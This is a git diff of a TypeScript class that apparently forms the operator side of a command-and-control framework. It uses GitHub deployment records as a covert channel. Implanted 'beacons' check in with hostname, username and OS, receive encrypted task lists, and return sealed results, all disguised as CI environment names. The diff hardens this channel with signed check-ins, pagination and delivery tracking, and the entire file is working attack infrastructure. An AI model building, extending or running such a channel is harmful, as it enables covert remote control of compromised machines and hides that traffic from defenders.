@@ -10,6 +10,23 @@
 import type { Octokit } from "@octokit/rest";
 import type { BeaconRegistry } from "../BeaconRegistry.ts";
 import type { TaskQueue } from "../TaskQueue.ts";
+import type { DurablePollState, PollRunner } from "../lib/PollRunner.ts";
+import { collectGitHubPages } from "../lib/GitHubPagination.ts";
+import {
+  claimDeliveries,
+  createChannelRunner,
+  createRepositoryPollState,
+  finishDeliveries,
+  processIncomingArtifact,
+  rejectArtifact,
+  type SecureChannelServices,
+} from "./ChannelRuntime.ts";
+import {
+  assertAcceptedResult,
+  checkinAuthorizesTaskDelivery,
+  parseCheckinPayload,
+  parseTaskResult,
+} from "./ChannelServices.ts";
 import {
   openSealBox, encryptForBeacon,
   base64ToBytes, bytesToBase64,
@@ -26,16 +43,7 @@ interface PagesChannelOpts {
   operatorSecretKey: Uint8Array;
   pollIntervalMs:    number;
   octokit:           Octokit;
-}
-
-interface AckPayload {
-  beaconId:  string;
-  publicKey: string;
-  hostname:  string;
-  username:  string;
-  os:        string;
-  arch:      string;
-  checkinAt: string;
+  services?:          SecureChannelServices;
 }
 
 /** 8 hex chars matching pattern: [0-9a-f]{8} */
@@ -44,39 +52,36 @@ const RESULT_ENV_RE = /^ci-r-([0-9a-f]{8})$/;
 const TASK_ENV_RE   = /^ci-t-([0-9a-f]{8})$/;
 
 export class PagesChannel {
-  private timer: ReturnType<typeof setInterval> | null = null;
-
-  /** beaconIds registered via ACK deployments */
-  private readonly pagesBeacons = new Set<string>();
+  private readonly runner: PollRunner;
+  private durableState: DurablePollState | null = null;
 
   /** Deployment IDs already processed as ACKs (avoid re-registration) */
   private readonly seenAckDeploymentIds = new Set<number>();
 
   /** Deployment IDs already processed as results (avoid re-processing) */
   private readonly processedResultDeployments = new Set<number>();
+  private defaultBranch: string | null = null;
 
   constructor(
     private readonly registry: BeaconRegistry,
     private readonly queue:    TaskQueue,
     private readonly opts:     PagesChannelOpts,
-  ) {}
+  ) {
+    this.runner = createChannelRunner(
+      "PagesChannel",
+      opts.pollIntervalMs,
+      () => this.poll(),
+    );
+  }
 
   start(): void {
-    if (this.timer) return;
-    this.timer = setInterval(() => {
-      this.poll().catch(err =>
-        console.error("[PagesChannel] Poll error:", (err as Error).message)
-      );
-    }, this.opts.pollIntervalMs);
+    this.runner.start();
     console.log("[PagesChannel] Started polling");
   }
 
-  stop(): void {
-    if (this.timer) {
-      clearInterval(this.timer);
-      this.timer = null;
-      console.log("[PagesChannel] Stopped");
-    }
+  async stop(): Promise<void> {
+    await this.runner.stop();
+    console.log("[PagesChannel] Stopped");
   }
 
   // ── Poll cycle ────────────────────────────────────────────────────────────────
@@ -84,55 +89,97 @@ export class PagesChannel {
   async poll(): Promise<void> {
     let deployments: any[];
     try {
-      const resp = await this.opts.octokit.rest.repos.listDeployments({
-        owner:    this.opts.owner,
-        repo:     this.opts.repo,
-        per_page: 100,
-      });
-      deployments = resp.data as any[];
+      deployments = await collectGitHubPages(
+        (page, per_page) =>
+          this.opts.octokit.rest.repos.listDeployments({
+            owner: this.opts.owner,
+            repo: this.opts.repo,
+            page,
+            per_page,
+          }),
+        (response) => response.data as any[],
+      );
     } catch (err) {
       console.warn("[PagesChannel] Failed to list deployments:", (err as Error).message);
       return;
     }
 
-    await this.processAckDeployments(deployments);
+    const deliveryEligible = await this.processAckDeployments(deployments);
     await this.processResultDeployments(deployments);
-    await this.deliverPendingTasks();
+    await this.deliverPendingTasks(deliveryEligible);
   }
 
   // ── ACK deployment processing ─────────────────────────────────────────────────
 
-  private async processAckDeployments(deployments: any[]): Promise<void> {
+  private async processAckDeployments(
+    deployments: any[],
+  ): Promise<Set<string>> {
+    const deliveryEligible = new Set<string>();
     for (const dep of deployments) {
       const env: string = dep.environment ?? "";
-      if (!ACK_ENV_RE.test(env)) continue;
+      const match = ACK_ENV_RE.exec(env);
+      if (!match) continue;
       if (this.seenAckDeploymentIds.has(dep.id)) continue;
-      this.seenAckDeploymentIds.add(dep.id);
 
       try {
-        const description: string = dep.description ?? "";
-        if (!description) continue;
+        const encodedPayload = typeof dep.payload === "string"
+          ? dep.payload
+          : (dep.payload ? JSON.stringify(dep.payload) : "");
+        const messageId = `ack:deployment:${String(dep.id)}`;
+        const processed = await processIncomingArtifact(
+          this.services,
+          this.pollState,
+          {
+            messageId,
+            payload: encodedPayload,
+            cursor: String(dep.id),
+          },
+          "malformed Pages ACK deployment",
+          () => {
+            if (!encodedPayload) rejectArtifact("ACK payload is empty");
+            const ack = parseCheckinPayload(encodedPayload);
+            if (
+              ack.beaconId.slice(0, 8).toLowerCase() !== match[1]
+            ) {
+              rejectArtifact(
+                "ACK identity does not match its deployment",
+              );
+            }
+            return ack;
+          },
+          async (ack) => {
+            const status =
+              await this.services.identities.verifyAndRegisterCheckin(
+              ack,
+              ack.beaconId,
+              5,
+            );
+            return {
+              outcome: checkinAuthorizesTaskDelivery(status)
+                ? "accepted"
+                : "duplicate",
+              beaconId: ack.beaconId,
+            };
+          },
+        );
+        if (processed.status === "conflicting_duplicate") {
+          rejectArtifact("conflicting ACK deployment");
+        }
+        if (processed.outcome === "rejected" || !processed.value) continue;
+        this.seenAckDeploymentIds.add(dep.id);
+        if (
+          processed.status === "processed" &&
+          processed.outcome === "accepted"
+        ) {
+          deliveryEligible.add(processed.value.beaconId);
+        }
 
-        const ack = JSON.parse(description) as AckPayload;
-        if (!ack.beaconId || !ack.publicKey) continue;
-
-        this.registry.register({
-          beaconId:    ack.beaconId,
-          issueNumber: 0,
-          publicKey:   ack.publicKey,
-          hostname:    ack.hostname,
-          username:    ack.username,
-          os:          ack.os,
-          arch:        ack.arch,
-          seq:         0,
-        });
-        this.pagesBeacons.add(ack.beaconId);
-
-        console.log(`[PagesChannel] Registered beacon ${ack.beaconId} from ACK deployment`);
+        console.log(`[PagesChannel] Registered beacon ${processed.value.beaconId} from ACK deployment`);
       } catch (err) {
         console.warn("[PagesChannel] ACK processing error:", (err as Error).message);
       }
     }
+    return deliveryEligible;
   }
 
   // ── Result deployment processing ──────────────────────────────────────────────
@@ -147,20 +194,67 @@ export class PagesChannel {
         const sealedPayload: string = typeof dep.payload === "string"
           ? dep.payload
           : (dep.payload ? JSON.stringify(dep.payload) : "");
-        if (!sealedPayload) continue;
 
         // Derive operator public key from secret key
         await _sodium.ready;
         const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);
-
-        const plainBytes = await openSealBox(sealedPayload, operatorPublicKey, this.opts.operatorSecretKey);
-        const plain = new TextDecoder().decode(plainBytes);
-        const result = JSON.parse(plain) as { taskId: string; beaconId: string; success: boolean; output: string };
-
-        if (result.taskId) {
-          this.queue.markCompleted(result.taskId, plain);
-          console.log(`[PagesChannel] Task ${result.taskId} completed (success=${result.success})`);
+        const messageId = `result:deployment:${String(dep.id)}`;
+        const processed = await processIncomingArtifact(
+          this.services,
+          this.pollState,
+          {
+            messageId,
+            payload: sealedPayload,
+            cursor: String(dep.id),
+          },
+          "malformed Pages result deployment",
+          async () => {
+            if (!sealedPayload) rejectArtifact("result payload is empty");
+            const plainBytes = await openSealBox(
+              sealedPayload,
+              operatorPublicKey,
+              this.opts.operatorSecretKey,
+            );
+            const result = parseTaskResult(
+              new TextDecoder().decode(plainBytes),
+            );
+            const environmentMatch = RESULT_ENV_RE.exec(env);
+            if (
+              !environmentMatch ||
+              result.beaconId.slice(0, 8).toLowerCase() !==
+                environmentMatch[1]
+            ) {
+              rejectArtifact(
+                "result beaconId does not match its deployment",
+              );
+            }
+            return result;
+          },
+          async (result) => {
+            const accepted = assertAcceptedResult(
+              await this.services.tasks.acceptSignedResult(
+                result,
+                result.beaconId,
+                {
+                  channel: `${this.pollState.channel}:result`,
+                  messageId,
+                },
+              ),
+            );
+            return {
+              outcome: accepted,
+              beaconId: result.beaconId,
+              taskId: result.taskId,
+            };
+          },
+        );
+        if (processed.status === "conflicting_duplicate") {
+          rejectArtifact("conflicting result deployment");
         }
+        if (processed.outcome === "rejected" || !processed.value) continue;
+        console.log(
+          `[PagesChannel] Task ${processed.value.taskId} accepted (success=${processed.value.success})`,
+        );
 
         this.processedResultDeployments.add(dep.id);
 
@@ -181,20 +275,35 @@ export class PagesChannel {
 
   // ── Task delivery ─────────────────────────────────────────────────────────────
 
-  private async deliverPendingTasks(): Promise<void> {
-    for (const beaconId of this.pagesBeacons) {
-      const allPending = this.queue.getPendingTasks(beaconId);
-      const pending = allPending.filter(
-        t => !t.preferredChannel || t.preferredChannel === "pages"
-      );
+  private async deliverPendingTasks(
+    deliveryEligible: ReadonlySet<string>,
+  ): Promise<void> {
+    for (const beaconId of deliveryEligible) {
+      const pending = this.queue.getDeliverableTasks(beaconId, "pages");
       if (pending.length === 0) continue;
+      const deliveries = claimDeliveries(
+        this.services,
+        "pages",
+        beaconId,
+        pending,
+        Math.max(this.opts.pollIntervalMs * 2, 60_000),
+      );
+      if (deliveries.length === 0) continue;
 
       const beacon = this.registry.get(beaconId);
-      if (!beacon) continue;
+      if (!beacon) {
+        finishDeliveries(
+          this.services,
+          deliveries,
+          "permanent_failure",
+          "beacon registry entry is unavailable",
+        );
+        continue;
+      }
 
       try {
         const beaconPublicKey = await base64ToBytes(beacon.publicKey);
-        const taskJson = JSON.stringify(pending.map(t => ({
+        const taskJson = JSON.stringify(deliveries.map(({ task: t }) => ({
           taskId: t.taskId,
           kind:   t.kind,
           args:   t.args,
@@ -212,7 +321,7 @@ export class PagesChannel {
         await this.opts.octokit.rest.repos.createDeployment({
           owner:             this.opts.owner,
           repo:              this.opts.repo,
-          ref:               "main",
+          ref:               await this.getDefaultBranch(),
           environment:       `ci-t-${id8}`,
           payload:           JSON.stringify(encrypted),
           description:       "tasks",
@@ -220,15 +329,49 @@ export class PagesChannel {
           required_contexts: [],
         } as any);
 
-        // Mark tasks as delivered
-        for (const t of pending) {
-          this.queue.markDelivered(t.taskId);
-        }
+        finishDeliveries(this.services, deliveries, "delivered");
 
-        console.log(`[PagesChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
+        console.log(`[PagesChannel] Delivered ${deliveries.length} task(s) to beacon ${beaconId}`);
       } catch (err) {
+        finishDeliveries(
+          this.services,
+          deliveries,
+          "transient_failure",
+          err,
+        );
         console.warn(`[PagesChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
       }
     }
+  }
+
+  private async getDefaultBranch(): Promise<string> {
+    if (this.defaultBranch) return this.defaultBranch;
+    const repository = await this.opts.octokit.rest.repos.get({
+      owner: this.opts.owner,
+      repo: this.opts.repo,
+    });
+    const branch = repository.data.default_branch?.trim();
+    if (!branch) throw new Error("repository has no default branch");
+    this.defaultBranch = branch;
+    return branch;
+  }
+
+  private get services(): SecureChannelServices {
+    if (!this.opts.services) {
+      throw new Error(
+        "PagesChannel secure services are required; refusing unsigned operation",
+      );
+    }
+    return this.opts.services;
+  }
+
+  private get pollState(): DurablePollState {
+    this.durableState ??= createRepositoryPollState(
+      this.services,
+      "pages",
+      this.opts.owner,
+      this.opts.repo,
+    );
+    return this.durableState;
   }
 }
